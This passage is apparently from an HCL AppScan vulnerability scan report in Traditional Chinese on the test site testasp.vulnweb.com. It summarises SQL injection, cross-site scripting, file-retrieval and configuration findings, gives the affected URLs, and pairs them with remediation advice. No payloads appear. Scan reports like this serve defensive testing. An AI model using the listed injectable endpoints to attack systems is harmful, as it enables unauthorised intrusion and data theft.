YG8Km3sHxf/4UQ/S+l3l1JA3y47wAhoHb9t2fOXfrwlNUVFb4xQpNYZorOs/8gl4oAoOl+qkY3U1k/nqRVdf4zD7zzNHDDkz/WV/5BCQygRgD36l07fUr92GcW37lgamNifrUeuUcAdjZSKaRhy8CIbNaU4dPX2PPU+s4/4m63NzxklFL9C1CIW76aCdxO8ZeoEcItWJ9HUOB2ko1bS3nceooCMe9z2ebTN8FwolSNKo9MEDAotrLpJc/g7ngp7/ugyW+HQOG/0kvq88aBFDA9FBIP+eZzOwQKIUvIlD5fSOYMJ3Eh/gcx/syflhtMogAAAABJRU5ErkJggg==);
          }
          .dataTable {
          border-collapse: collapse;
          width: 100%;
          }

          .dataTable th,.dataTable td {
          text-align: left;
          padding: 4px 12px;
          border-bottom: 1px solid #CCC;
          }

          .dataTable td:last-child {
          width: 100%;
          }

          #watermark {
          color: #f0f0f0;
          font-size: 120pt;
          -webkit-transform: rotate(-45deg);
          -moz-transform: rotate(-45deg);
          position: absolute;
          width: 100%;
          height: 80%;
          margin: 0;
          z-index: -1;
          left: 100px;
          top: 150px;
          }

        </style><style type="text/css" media="all, print, screen">
            body, html {
            margin: 1cm;
            }
          </style></head><body>
           
          
          <input type="hidden" name="sectionstart" /><div></div>
           
          

          <div class="logos"><div class="cell left"></div><div class="cell right"></div></div><div class="headerUnderline"></div><h1 style="margin-top: 6cm; page-break-before: auto">Web 應用程式報告<br /></h1><h3>這份報告包含關於 Web 應用程式的重要安全資訊。<br /></h3><h2>安全報告</h2>這份報告是由 HCL AppScan Standard 所建立 10.8.0<br />掃描開始時間： 2025/2/5 下午11:23:07<br />
           
          
          <input type="hidden" name="sectionstart" />
           
          

          <h1 id="toc"><a name="toc"></a>目錄</h1><div class="toc" xmlns=""><h2><a href="#introduction">簡介</a></h2><ul><li><a href="#generalInformation">一般資訊</a></li><li><a href="#loginSettings">登入設定值</a></li></ul><h2><a href="#executiveSummary">摘要</a></h2><ul><li><a href="#executiveSummaryIssueType">問題類型</a></li><li><a href="#executiveSummaryUrl">有漏洞的 URL</a></li><li><a href="#executiveSummaryFix">修正建議</a></li><li><a href="#executiveSummarySecurityRisks">安全風險</a></li><li><a href="#executiveSummaryCauses">原因</a></li><li><a href="#executiveSummaryThreatClassification">WASC 威脅分類</a></li></ul><h2><a href="#issuesByIssueType">依問題類型分組的問題</a></h2><ul><li><a href="#attBlindSqlInjectionADNSMSSQL">MsSQL 盲目 SQL 注入（頻外）</a><span class="count">1</span></li><li><a href="#attBlindSqlInjectionStrings">盲目的 SQL 注入</a><span class="count">1</span></li><li><a href="#attCrossSiteScripting">反映型跨網站指令碼</a><span class="count">1</span></li><li><a href="#attNullByte">擷取毒害空值位元組 Windows 檔案</a><span class="count">1</span></li><li><a href="#attIntegerOverflow">整數溢位</a><span class="count">1</span></li><li><a href="#GV_StoredXSS">預存的跨網站指令碼</a><span class="count">2</span></li><li><a href="#attVtiCnf">Microsoft FrontPage 目錄清單</a><span class="count">1</span></li><li><a href="#attSameSiteCookie">SameSite 屬性不安全、不適當或遺漏的 Cookie</a><span class="count">2</span></li><li><a href="#attFileWin32">Windows 檔案參數變更</a><span class="count">1</span></li><li><a href="#VulnerableComponent">有弱點的元件</a><span class="count">1</span></li><li><a href="#attDirectoryFound">偵測到隱藏目錄</a><span class="count">6</span></li><li><a href="#attRespCookieNotHttpOnlySessionCookie">在階段作業 Cookie 中遺漏 HttpOnly 屬性</a><span class="count">2</span></li><li><a href="#attUnnecessaryResponseHeaders">應用程式中找到不必要的 HTTP 回應標頭</a><span class="count">1</span></li><li><a href="#attNoHttpsRedirection">缺少加密</a><span class="count">1</span></li><li><a href="#attContentSecurityPolicy">遺漏「Content-Security-Policy」標頭</a><span class="count">1</span></li><li><a href="#ContentTypeOptions">遺漏或不安全的 "X-Content-Type-Options" 標頭</a><span class="count">1</span></li><li><a href="#attUndefinedState">應用程式錯誤</a><span class="count">3</span></li><li><a href="#attReferrerPolicyHeaderExist">遺漏「查閱者原則」安全標頭</a><span class="count">1</span></li></ul><h2><a href="#howToFix">如何修正</a></h2><ul><li><a href="#attBlindSqlInjectionADNSMSSQL_Adv">MsSQL 盲目 SQL 注入（頻外）</a></li><li><a href="#attBlindSqlInjectionStrings_Adv">盲目的 SQL 注入</a></li><li><a href="#attCrossSiteScripting_Adv">反映型跨網站指令碼</a></li><li><a href="#attNullByte_Adv">擷取毒害空值位元組 Windows 檔案</a></li><li><a href="#attIntegerOverflow_Adv">整數溢位</a></li><li><a href="#GV_StoredXSS_Adv">預存的跨網站指令碼</a></li><li><a href="#attVtiCnf_Adv">Microsoft FrontPage 目錄清單</a></li><li><a href="#attSameSiteCookie_Adv">SameSite 屬性不安全、不適當或遺漏的 Cookie</a></li><li><a href="#attFileWin32_Adv">Windows 檔案參數變更</a></li><li><a href="#VulnerableComponent_Adv">有弱點的元件</a></li><li><a href="#attDirectoryFound_Adv">偵測到隱藏目錄</a></li><li><a href="#attRespCookieNotHttpOnlySessionCookie_Adv">在階段作業 Cookie 中遺漏 HttpOnly 屬性</a></li><li><a href="#attUnnecessaryResponseHeaders_Adv">應用程式中找到不必要的 HTTP 回應標頭</a></li><li><a href="#attNoHttpsRedirection_Adv">缺少加密</a></li><li><a href="#attContentSecurityPolicy_Adv">遺漏「Content-Security-Policy」標頭</a></li><li><a href="#ContentTypeOptions_Adv">遺漏或不安全的 "X-Content-Type-Options" 標頭</a></li><li><a href="#attUndefinedState_Adv">應用程式錯誤</a></li><li><a href="#attReferrerPolicyHeaderExist_Adv">遺漏「查閱者原則」安全標頭</a></li></ul><h2><a href="#applicationData">應用程式資料</a></h2><ul><li><a href="#cookies">Cookie</a></li><li><a href="#javaScripts">JavaScript</a></li><li><a href="#parameters">參數</a></li><li><a href="#comments">註解</a></li><li><a href="#visitedLinks">造訪的 URL</a></li><li><a href="#brokenLinks">失敗要求</a></li></ul></div>
           
          
          <input type="hidden" name="sectionstart" />
           
          
          <h1 id="introduction" xmlns=""><a name="introduction"></a>簡介</h1><p xmlns="">這份報告包含由 HCL AppScan Standard 執行 Web 應用程式安全掃描的結果。</p><table xmlns=""><tr><td>重大嚴重性問題：</td><td>2</td></tr><tr><td>高嚴重性問題：</td><td>5</td></tr><tr><td>中嚴重性問題：</td><td>5</td></tr><tr><td>低嚴重性問題：</td><td>12</td></tr><tr><td>參考資訊嚴重性問題：</td><td>4</td></tr><tr><td>報告中併入的安全問題總計：</td><td>28</td></tr><tr><td>掃描中探索到的安全問題總計：</td><td>28</td></tr></table><h2 id="generalInformation" xmlns="">一般資訊<a name="generalInformation"></a></h2><div class="row" xmlns=""><div class="name">掃描檔名：</div><div class="value">appscan_http___testasp.vulnweb.com_</div></div><div class="row" xmlns=""><div class="name">掃描開始時間：</div><div class="value">2025/2/5 下午11:23:07</div></div><div class="row" xmlns=""><div class="name">測試原則：</div><div class="value">Default</div></div><div class="row" xmlns=""><div class="name">CVSS 版本：</div><div class="value">3.1</div></div><div class="row" xmlns=""><div class="name">測試最佳化等級：</div><div class="value">快速</div></div><br xmlns="" /><div class="row" xmlns=""><div class="name">主機</div><div class="value">testasp.vulnweb.com</div></div><div class="row" xmlns=""><div class="name">埠</div><div class="value">80</div></div><div class="row" xmlns=""><div class="name">作業系統：</div><div class="value">Win32</div></div><div class="row" xmlns=""><div class="name">Web 伺服器：</div><div class="value">IIS</div></div><div class="row" xmlns=""><div class="name">應用程式伺服器：</div><div class="value">ASP.NET</div></div><h2 id="loginSettings" xmlns="">登入設定值<a name="loginSettings"></a></h2><div class="row" xmlns=""><div class="name">登入方法：</div><div class="value">已記錄的登入</div></div><div class="row" xmlns=""><div class="name">並行登入：</div><div class="value">已啟用</div></div><div class="row" xmlns=""><div class="name">階段作業內偵測：</div><div class="value">已停用</div></div><div class="row" xmlns=""><div class="name">階段作業內型樣：</div><div class="value monospace"></div></div><div class="row" xmlns=""><div class="name">已追蹤或階段作業 ID Cookies：</div><div class="value"><ul class="listStyleNone"></ul></div></div><div class="row" xmlns=""><div class="name">已追蹤或階段作業 ID 參數：</div><div class="value"><ul class="listStyleNone"></ul></div></div><div class="row" xmlns=""><div class="name">登入序列：</div><div class="value"><ul class="listStyleNone" style="width: 13cm"></ul></div></div>
             
            
            <input type="hidden" name="sectionstart" />
             
            
            <h1 id="executiveSummary"><a name="executiveSummary"></a>摘要</h1><div id="executiveSummaryIssueType" class="h2group" xmlns=""><h2>問題類型
				 
				<span class="count">18</span></h2><a name="executiveSummaryIssueType"></a><a class="toclink" href="#toc">目錄</a></div><table class="datatable nowordwrap" xmlns=""><tr><th></th><th>問題類型</th><th colspan="2">問題數目</th></tr><tr><td class="severity severity_6">重</td><td style="width:66%"><a href="#attBlindSqlInjectionADNSMSSQL">MsSQL 盲目 SQL 注入（頻外）</a></td><td>1</td><td style="width:33%"><div style="width:16.666666666666668%;" class="severity_6" title="1"></div><div style="width:0%;" class="severity_3" title="0"></div><div style="width:0%;" class="severity_2" title="0"></div><div style="width:0%;" class="severity_1" title="0"></div><div style="width:0%;" class="severity_0" title="0"></div></td></tr><tr><td class="severity severity_6">重</td><td style="width:66%"><a href="#attBlindSqlInjectionStrings">盲目的 SQL 注入</a></td><td>1</td><td style="width:33%"><div style="width:16.666666666666668%;" class="severity_6" title="1"></div><div style="width:0%;" class="severity_3" title="0"></div><div style="width:0%;" class="severity_2" title="0"></div><div style="width:0%;" class="severity_1" title="0"></div><div style="width:0%;" class="severity_0" title="0"></div></td></tr><tr><td class="severity severity_3">高</td><td style="width:66%"><a href="#attCrossSiteScripting">反映型跨網站指令碼</a></td><td>1</td><td style="width:33%"><div style="width:0%;" class="severity_6" title="0"></div><div style="width:16.666666666666668%;" class="severity_3" title="1"></div><div style="width:0%;" class="severity_2" title="0"></div><div style="width:0%;" class="severity_1" title="0"></div><div style="width:0%;" class="severity_0" title="0"></div></td></tr><tr><td class="severity severity_3">高</td><td style="width:66%"><a href="#attNullByte">擷取毒害空值位元組 Windows 檔案</a></td><td>1</td><td style="width:33%"><div style="width:0%;" class="severity_6" title="0"></div><div style="width:16.666666666666668%;" class="severity_3" title="1"></div><div style="width:0%;" class="severity_2" title="0"></div><div style="width:0%;" class="severity_1" title="0"></div><div style="width:0%;" class="severity_0" title="0"></div></td></tr><tr><td class="severity severity_3">高</td><td style="width:66%"><a href="#attIntegerOverflow">整數溢位</a></td><td>1</td><td style="width:33%"><div style="width:0%;" class="severity_6" title="0"></div><div style="width:16.666666666666668%;" class="severity_3" title="1"></div><div style="width:0%;" class="severity_2" title="0"></div><div style="width:0%;" class="severity_1" title="0"></div><div style="width:0%;" class="severity_0" title="0"></div></td></tr><tr><td class="severity severity_3">高</td><td style="width:66%"><a href="#GV_StoredXSS">預存的跨網站指令碼</a></td><td>2</td><td style="width:33%"><div style="width:0%;" class="severity_6" title="0"></div><div style="width:33.333333333333336%;" class="severity_3" title="2"></div><div style="width:0%;" class="severity_2" title="0"></div><div style="width:0%;" class="severity_1" title="0"></div><div style="width:0%;" class="severity_0" title="0"></div></td></tr><tr><td class="severity severity_2">中</td><td style="width:66%"><a href="#attVtiCnf">Microsoft FrontPage 目錄清單</a></td><td>1</td><td style="width:33%"><div style="width:0%;" class="severity_6" title="0"></div><div style="width:0%;" class="severity_3" title="0"></div><div style="width:16.666666666666668%;" class="severity_2" title="1"></div><div style="width:0%;" class="severity_1" title="0"></div><div style="width:0%;" class="severity_0" title="0"></div></td></tr><tr><td class="severity severity_2">中</td><td style="width:66%"><a href="#attSameSiteCookie">SameSite 屬性不安全、不適當或遺漏的 Cookie</a></td><td>2</td><td style="width:33%"><div style="width:0%;" class="severity_6" title="0"></div><div style="width:0%;" class="severity_3" title="0"></div><div style="width:33.333333333333336%;" class="severity_2" title="2"></div><div style="width:0%;" class="severity_1" title="0"></div><div style="width:0%;" class="severity_0" title="0"></div></td></tr><tr><td class="severity severity_2">中</td><td style="width:66%"><a href="#attFileWin32">Windows 檔案參數變更</a></td><td>1</td><td style="width:33%"><div style="width:0%;" class="severity_6" title="0"></div><div style="width:0%;" class="severity_3" title="0"></div><div style="width:16.666666666666668%;" class="severity_2" title="1"></div><div style="width:0%;" class="severity_1" title="0"></div><div style="width:0%;" class="severity_0" title="0"></div></td></tr><tr><td class="severity severity_2">中</td><td style="width:66%"><a href="#VulnerableComponent">有弱點的元件</a></td><td>1</td><td style="width:33%"><div style="width:0%;" class="severity_6" title="0"></div><div style="width:0%;" class="severity_3" title="0"></div><div style="width:16.666666666666668%;" class="severity_2" title="1"></div><div style="width:0%;" class="severity_1" title="0"></div><div style="width:0%;" class="severity_0" title="0"></div></td></tr><tr><td class="severity severity_1">低</td><td style="width:66%"><a href="#attDirectoryFound">偵測到隱藏目錄</a></td><td>6</td><td style="width:33%"><div style="width:0%;" class="severity_6" title="0"></div><div style="width:0%;" class="severity_3" title="0"></div><div style="width:0%;" class="severity_2" title="0"></div><div style="width:100%;" class="severity_1" title="6"></div><div style="width:0%;" class="severity_0" title="0"></div></td></tr><tr><td class="severity severity_1">低</td><td style="width:66%"><a href="#attRespCookieNotHttpOnlySessionCookie">在階段作業 Cookie 中遺漏 HttpOnly 屬性</a></td><td>2</td><td style="width:33%"><div style="width:0%;" class="severity_6" title="0"></div><div style="width:0%;" class="severity_3" title="0"></div><div style="width:0%;" class="severity_2" title="0"></div><div style="width:33.333333333333336%;" class="severity_1" title="2"></div><div style="width:0%;" class="severity_0" title="0"></div></td></tr><tr><td class="severity severity_1">低</td><td style="width:66%"><a href="#attUnnecessaryResponseHeaders">應用程式中找到不必要的 HTTP 回應標頭</a></td><td>1</td><td style="width:33%"><div style="width:0%;" class="severity_6" title="0"></div><div style="width:0%;" class="severity_3" title="0"></div><div style="width:0%;" class="severity_2" title="0"></div><div style="width:16.666666666666668%;" class="severity_1" title="1"></div><div style="width:0%;" class="severity_0" title="0"></div></td></tr><tr><td class="severity severity_1">低</td><td style="width:66%"><a href="#attNoHttpsRedirection">缺少加密</a></td><td>1</td><td style="width:33%"><div style="width:0%;" class="severity_6" title="0"></div><div style="width:0%;" class="severity_3" title="0"></div><div style="width:0%;" class="severity_2" title="0"></div><div style="width:16.666666666666668%;" class="severity_1" title="1"></div><div style="width:0%;" class="severity_0" title="0"></div></td></tr><tr><td class="severity severity_1">低</td><td style="width:66%"><a href="#attContentSecurityPolicy">遺漏「Content-Security-Policy」標頭</a></td><td>1</td><td style="width:33%"><div style="width:0%;" class="severity_6" title="0"></div><div style="width:0%;" class="severity_3" title="0"></div><div style="width:0%;" class="severity_2" title="0"></div><div style="width:16.666666666666668%;" class="severity_1" title="1"></div><div style="width:0%;" class="severity_0" title="0"></div></td></tr><tr><td class="severity severity_1">低</td><td style="width:66%"><a href="#ContentTypeOptions">遺漏或不安全的 "X-Content-Type-Options" 標頭</a></td><td>1</td><td style="width:33%"><div style="width:0%;" class="severity_6" title="0"></div><div style="width:0%;" class="severity_3" title="0"></div><div style="width:0%;" class="severity_2" title="0"></div><div style="width:16.666666666666668%;" class="severity_1" title="1"></div><div style="width:0%;" class="severity_0" title="0"></div></td></tr><tr><td class="severity severity_0">參</td><td style="width:66%"><a href="#attUndefinedState">應用程式錯誤</a></td><td>3</td><td style="width:33%"><div style="width:0%;" class="severity_6" title="0"></div><div style="width:0%;" class="severity_3" title="0"></div><div style="width:0%;" class="severity_2" title="0"></div><div style="width:0%;" class="severity_1" title="0"></div><div style="width:50%;" class="severity_0" title="3"></div></td></tr><tr><td class="severity severity_0">參</td><td style="width:66%"><a href="#attReferrerPolicyHeaderExist">遺漏「查閱者原則」安全標頭</a></td><td>1</td><td style="width:33%"><div style="width:0%;" class="severity_6" title="0"></div><div style="width:0%;" class="severity_3" title="0"></div><div style="width:0%;" class="severity_2" title="0"></div><div style="width:0%;" class="severity_1" title="0"></div><div style="width:16.666666666666668%;" class="severity_0" title="1"></div></td></tr></table><div id="executiveSummaryUrl" class="h2group" xmlns=""><h2>有漏洞的 URL
				 
				<span class="count">4</span></h2><a name="executiveSummaryUrl"></a><a class="toclink" href="#toc">目錄</a></div><table class="datatable" xmlns=""><tr><th></th><th>URL</th><th colspan="2">問題數目</th></tr><tr><td class="severity severity_6">重</td><td style="width:64%">http://testasp.vulnweb.com/showthread.asp</td><td style="width:4%">6</td><td style="width:32%"><div style="width:11.764705882352942%;" class="severity_6" title="2"></div><div style="width:17.647058823529413%;" class="severity_3" title="3"></div><div style="width:0%;" class="severity_2" title="0"></div><div style="width:0%;" class="severity_1" title="0"></div><div style="width:5.882352941176471%;" class="severity_0" title="1"></div></td></tr><tr><td class="severity severity_3">高</td><td style="width:64%">http://testasp.vulnweb.com/Search.asp</td><td style="width:4%">2</td><td style="width:32%"><div style="width:0%;" class="severity_6" title="0"></div><div style="width:5.882352941176471%;" class="severity_3" title="1"></div><div style="width:0%;" class="severity_2" title="0"></div><div style="width:0%;" class="severity_1" title="0"></div><div style="width:5.882352941176471%;" class="severity_0" title="1"></div></td></tr><tr><td class="severity severity_3">高</td><td style="width:64%">http://testasp.vulnweb.com/Templatize.asp</td><td style="width:4%">3</td><td style="width:32%"><div style="width:0%;" class="severity_6" title="0"></div><div style="width:5.882352941176471%;" class="severity_3" title="1"></div><div style="width:5.882352941176471%;" class="severity_2" title="1"></div><div style="width:0%;" class="severity_1" title="0"></div><div style="width:5.882352941176471%;" class="severity_0" title="1"></div></td></tr><tr><td class="severity severity_2">中</td><td style="width:64%">http://testasp.vulnweb.com/</td><td style="width:4%">17</td><td style="width:32%"><div style="width:0%;" class="severity_6" title="0"></div><div style="width:0%;" class="severity_3" title="0"></div><div style="width:23.529411764705884%;" class="severity_2" title="4"></div><div style="width:70.58823529411765%;" class="severity_1" title="12"></div><div style="width:5.882352941176471%;" class="severity_0" title="1"></div></td></tr></table><div id="executiveSummaryFix" class="h2group" xmlns=""><h2>修正建議
				 
				<span class="count">13</span></h2><a name="executiveSummaryFix"></a><a class="toclink" href="#toc">目錄</a></div><table class="datatable nowordwrap" xmlns=""><tr><th></th><th>補救作業</th><th colspan="2">問題數目</th></tr><tr><td class="severity severity_3">高</td><td style="width:66%"><a href="#fix_52000">檢查危險字元注入可能的解決方案</a></td><td>5</td><td style="width:33%"><div style="width:83.33333333333334%; height:16px" class="severity_3"></div></td></tr><tr><td class="severity severity_3">高</td><td style="width:66%"><a href="#fix_50160">確定所存取的檔案位於虛擬路徑中，且具有特定副檔名；從使用者輸入移除特殊字元</a></td><td>2</td><td style="width:33%"><div style="width:33.333333333333336%; height:16px" class="severity_3"></div></td></tr><tr><td class="severity severity_3">高</td><td style="width:66%"><a href="#fix_50300">請驗證參數值是在預期的範圍內且為預期的類型。請勿輸出除錯錯誤訊息和異常狀況</a></td><td>4</td><td style="width:33%"><div style="width:66.66666666666667%; height:16px" class="severity_3"></div></td></tr><tr><td class="severity severity_2">中</td><td style="width:66%"><a href="#fix_50100">修改伺服器配置來拒絕存取含有機密性資訊的目錄</a></td><td>1</td><td style="width:33%"><div style="width:16.666666666666668%; height:16px" class="severity_2"></div></td></tr><tr><td class="severity severity_2">中</td><td style="width:66%"><a href="#fix_vulnerable_component">將元件升級到最新穩定版本</a></td><td>1</td><td style="width:33%"><div style="width:16.666666666666668%; height:16px" class="severity_2"></div></td></tr><tr><td class="severity severity_2">中</td><td style="width:66%"><a href="#fix_61797">檢閱將 SameSite Cookie 屬性配置為建議值的可能解決方案</a></td><td>2</td><td style="width:33%"><div style="width:33.333333333333336%; height:16px" class="severity_2"></div></td></tr><tr><td class="severity severity_1">低</td><td style="width:66%"><a href="#fix_50330">對禁止的資源發出「404 - 找不到」回應狀態碼，或將其完全移除</a></td><td>6</td><td style="width:33%"><div style="width:100%; height:16px" class="severity_1"></div></td></tr><tr><td class="severity severity_1">低</td><td style="width:66%"><a href="#fix_52741">新增 'HttpOnly' 屬性至所有階段作業 Cookie</a></td><td>2</td><td style="width:33%"><div style="width:33.333333333333336%; height:16px" class="severity_1"></div></td></tr><tr><td class="severity severity_1">低</td><td style="width:66%"><a href="#fix_insecureHttpScheme">設定 TLS/SSL 以確保將通訊加密。</a></td><td>1</td><td style="width:33%"><div style="width:16.666666666666668%; height:16px" class="severity_1"></div></td></tr><tr><td class="severity severity_1">低</td><td style="width:66%"><a href="#fix_MA_attInformationLeakage">請勿容許機密性資訊洩漏。</a></td><td>1</td><td style="width:33%"><div style="width:16.666666666666668%; height:16px" class="severity_1"></div></td></tr><tr><td class="severity severity_1">低</td><td style="width:66%"><a href="#fix_61767">配置伺服器利用 "nosniff" 值使用 "X-Content-Type-Options" 標頭</a></td><td>1</td><td style="width:33%"><div style="width:16.666666666666668%; height:16px" class="severity_1"></div></td></tr><tr><td class="severity severity_1">低</td><td style="width:66%"><a href="#fix_61770">配置伺服器利用安全原則使用 "Content-Security-Policy" 標頭</a></td><td>1</td><td style="width:33%"><div style="width:16.666666666666668%; height:16px" class="severity_1"></div></td></tr><tr><td class="severity severity_1">低</td><td style="width:66%"><a href="#fix_61771">配置您的伺服器，以搭配安全原則使用「查閱者原則」標頭</a></td><td>1</td><td style="width:33%"><div style="width:16.666666666666668%; height:16px" class="severity_1"></div></td></tr></table><div id="executiveSummarySecurityRisks" class="h2group" xmlns=""><h2>安全風險<span class="count">11</span></h2><a name="executiveSummarySecurityRisks"></a><a class="toclink" href="#toc">目錄</a></div><table class="datatable nowordwrap" xmlns=""><tr><th></th><th>風險</th><th colspan="2">問題數目</th></tr><tr><td class="severity severity_6">重</td><td style="width:66%">有可能檢視、修改或刪除資料庫項目和表格</td><td>2</td><td style="width:33%"><div style="width:33.333333333333336%;" class="severity_6" title="2"></div><div style="width:0%;" class="severity_3" title="0"></div><div style="width:0%;" class="severity_2" title="0"></div><div style="width:0%;" class="severity_1" title="0"></div><div style="width:0%;" class="severity_0" title="0"></div></td></tr><tr><td class="severity severity_3">高</td><td style="width:66%">有可能竊取或操作客戶階段作業和 Cookie，並可能用來假冒合法的使用者，讓駭客可以檢視或變更使用者記錄，以及用該使用者的身分來執行交易</td><td>5</td><td style="width:33%"><div style="width:0%;" class="severity_6" title="0"></div><div style="width:50%;" class="severity_3" title="3"></div><div style="width:0%;" class="severity_2" title="0"></div><div style="width:33.333333333333336%;" class="severity_1" title="2"></div><div style="width:0%;" class="severity_0" title="0"></div></td></tr><tr><td class="severity severity_3">高</td><td style="width:66%">有可能檢視 Web 伺服器上任何檔案（例如：資料庫、使用者資訊或配置檔）的內容，但受 Web 伺服器使用者的許可權限制</td><td>2</td><td style="width:33%"><div style="width:0%;" class="severity_6" title="0"></div><div style="width:16.666666666666668%;" class="severity_3" title="1"></div><div style="width:16.666666666666668%;" class="severity_2" title="1"></div><div style="width:0%;" class="severity_1" title="0"></div><div style="width:0%;" class="severity_0" title="0"></div></td></tr><tr><td class="severity severity_3">高</td><td style="width:66%">有可能收集機密性除錯資訊</td><td>4</td><td style="width:33%"><div style="width:0%;" class="severity_6" title="0"></div><div style="width:16.666666666666668%;" class="severity_3" title="1"></div><div style="width:0%;" class="severity_2" title="0"></div><div style="width:0%;" class="severity_1" title="0"></div><div style="width:50%;" class="severity_0" title="3"></div></td></tr><tr><td class="severity severity_2">中</td><td style="width:66%">有可能檢視及下載某些 Web 應用程式虛擬目錄的內容，其可能包含受限的檔案</td><td>1</td><td style="width:33%"><div style="width:0%;" class="severity_6" title="0"></div><div style="width:0%;" class="severity_3" title="0"></div><div style="width:16.666666666666668%;" class="severity_2" title="1"></div><div style="width:0%;" class="severity_1" title="0"></div><div style="width:0%;" class="severity_0" title="0"></div></td></tr><tr><td class="severity severity_2">中</td><td style="width:66%">將 Cookie 限制為第一方或相同網站環境定義以預防 Cookie 資訊洩漏。如果沒有設置額外的保護措施（如反 CSRF 記號），攻擊者可以延伸為偽造跨網站要求 (CSRF) 攻擊。</td><td>2</td><td style="width:33%"><div style="width:0%;" class="severity_6" title="0"></div><div style="width:0%;" class="severity_3" title="0"></div><div style="width:33.333333333333336%;" class="severity_2" title="2"></div><div style="width:0%;" class="severity_1" title="0"></div><div style="width:0%;" class="severity_0" title="0"></div></td></tr><tr><td class="severity severity_2">中</td><td style="width:66%">攻擊者有可能使用 Web 伺服器來攻擊其他網站，讓其身分更加隱密</td><td>1</td><td style="width:33%"><div style="width:0%;" class="severity_6" title="0"></div><div style="width:0%;" class="severity_3" title="0"></div><div style="width:16.666666666666668%;" class="severity_2" title="1"></div><div style="width:0%;" class="severity_1" title="0"></div><div style="width:0%;" class="severity_0" title="0"></div></td></tr><tr><td class="severity severity_1">低</td><td style="width:66%">有可能擷取網站檔案系統結構的相關資訊，其可能會幫助攻擊者對映網站</td><td>6</td><td style="width:33%"><div style="width:0%;" class="severity_6" title="0"></div><div style="width:0%;" class="severity_3" title="0"></div><div style="width:0%;" class="severity_2" title="0"></div><div style="width:100%;" class="severity_1" title="6"></div><div style="width:0%;" class="severity_0" title="0"></div></td></tr><tr><td class="severity severity_1">低</td><td style="width:66%">有可能收集 Web 應用程式相關的機密性資訊，如：使用者名稱、密碼、機器名稱及/或機密檔案位置</td><td>4</td><td style="width:33%"><div style="width:0%;" class="severity_6" title="0"></div><div style="width:0%;" class="severity_3" title="0"></div><div style="width:0%;" class="severity_2" title="0"></div><div style="width:50%;" class="severity_1" title="3"></div><div style="width:16.666666666666668%;" class="severity_0" title="1"></div></td></tr><tr><td class="severity severity_1">低</td><td style="width:66%">有可能竊取以未加密方式傳送的機密資料，如：信用卡號碼、社會保險號碼等等</td><td>1</td><td style="width:33%"><div style="width:0%;" class="severity_6" title="0"></div><div style="width:0%;" class="severity_3" title="0"></div><div style="width:0%;" class="severity_2" title="0"></div><div style="width:16.666666666666668%;" class="severity_1" title="1"></div><div style="width:0%;" class="severity_0" title="0"></div></td></tr><tr><td class="severity severity_1">低</td><td style="width:66%">有可能說服無經驗而易受騙的使用者提供機密性資訊，如：使用者名稱、密碼、信用卡號碼、社會保險號碼等等</td><td>3</td><td style="width:33%"><div style="width:0%;" class="severity_6" title="0"></div><div style="width:0%;" class="severity_3" title="0"></div><div style="width:0%;" class="severity_2" title="0"></div><div style="width:33.333333333333336%;" class="severity_1" title="2"></div><div style="width:16.666666666666668%;" class="severity_0" title="1"></div></td></tr></table><div id="executiveSummaryCauses" class="h2group" xmlns=""><h2>原因
				 
				<span class="count">25</span></h2><a name="executiveSummaryCauses"></a><a class="toclink" href="#toc">目錄</a></div><table class="datatable nowordwrap" xmlns=""><tr><th></th><th>原因</th><th colspan="2">問題數目</th></tr><tr><td class="severity severity_6">重</td><td style="width:66%">未正確地消毒使用者所輸入的危險字元</td><td>7</td><td style="width:33%"><div style="width:28.571428571428573%;" class="severity_6" title="2"></div><div style="width:57.142857142857146%;" class="severity_3" title="4"></div><div style="width:14.285714285714286%;" class="severity_2" title="1"></div><div style="width:0%;" class="severity_1" title="0"></div><div style="width:0%;" class="severity_0" title="0"></div></td></tr><tr><td class="severity severity_3">高</td><td style="width:66%">未檢查使用者輸入是否有 '..' （雙點）字串</td><td>2</td><td style="width:33%"><div style="width:0%;" class="severity_6" title="0"></div><div style="width:14.285714285714286%;" class="severity_3" title="1"></div><div style="width:14.285714285714286%;" class="severity_2" title="1"></div><div style="width:0%;" class="severity_1" title="0"></div><div style="width:0%;" class="severity_0" title="0"></div></td></tr><tr><td class="severity severity_3">高</td><td style="width:66%">未對送入的參數值執行適當的範圍檢查</td><td>4</td><td style="width:33%"><div style="width:0%;" class="severity_6" title="0"></div><div style="width:14.285714285714286%;" class="severity_3" title="1"></div><div style="width:0%;" class="severity_2" title="0"></div><div style="width:0%;" class="severity_1" title="0"></div><div style="width:42.85714285714286%;" class="severity_0" title="3"></div></td></tr><tr><td class="severity severity_3">高</td><td style="width:66%">未執行驗證，以確定使用者輸入符合預期的資料類型</td><td>4</td><td style="width:33%"><div style="width:0%;" class="severity_6" title="0"></div><div style="width:14.285714285714286%;" class="severity_3" title="1"></div><div style="width:0%;" class="severity_2" title="0"></div><div style="width:0%;" class="severity_1" title="0"></div><div style="width:42.85714285714286%;" class="severity_0" title="3"></div></td></tr><tr><td class="severity severity_2">中</td><td style="width:66%">已使用不適當的安全設定來安裝 FrontPage Server Extensions</td><td>1</td><td style="width:33%"><div style="width:0%;" class="severity_6" title="0"></div><div style="width:0%;" class="severity_3" title="0"></div><div style="width:14.285714285714286%;" class="severity_2" title="1"></div><div style="width:0%;" class="severity_1" title="0"></div><div style="width:0%;" class="severity_0" title="0"></div></td></tr><tr><td class="severity severity_2">中</td><td style="width:66%">SameSite 屬性不適當、不安全或遺漏的機密 Cookie</td><td>2</td><td style="width:33%"><div style="width:0%;" class="severity_6" title="0"></div><div style="width:0%;" class="severity_3" title="0"></div><div style="width:28.571428571428573%;" class="severity_2" title="2"></div><div style="width:0%;" class="severity_1" title="0"></div><div style="width:0%;" class="severity_0" title="0"></div></td></tr><tr><td class="severity severity_2">中</td><td style="width:66%">未安裝協力廠商產品的最新修補程式或緊急修復程式</td><td>1</td><td style="width:33%"><div style="width:0%;" class="severity_6" title="0"></div><div style="width:0%;" class="severity_3" title="0"></div><div style="width:14.285714285714286%;" class="severity_2" title="1"></div><div style="width:0%;" class="severity_1" title="0"></div><div style="width:0%;" class="severity_0" title="0"></div></td></tr><tr><td class="severity severity_1">低</td><td style="width:66%">使用不安全的方式配置 Web 伺服器或應用程式伺服器</td><td>6</td><td style="width:33%"><div style="width:0%;" class="severity_6" title="0"></div><div style="width:0%;" class="severity_3" title="0"></div><div style="width:0%;" class="severity_2" title="0"></div><div style="width:85.71428571428572%;" class="severity_1" title="6"></div><div style="width:0%;" class="severity_0" title="0"></div></td></tr><tr><td class="severity severity_1">低</td><td style="width:66%">Web 應用程式設定的階段作業 Cookie 不含 HttpOnly 屬性</td><td>2</td><td 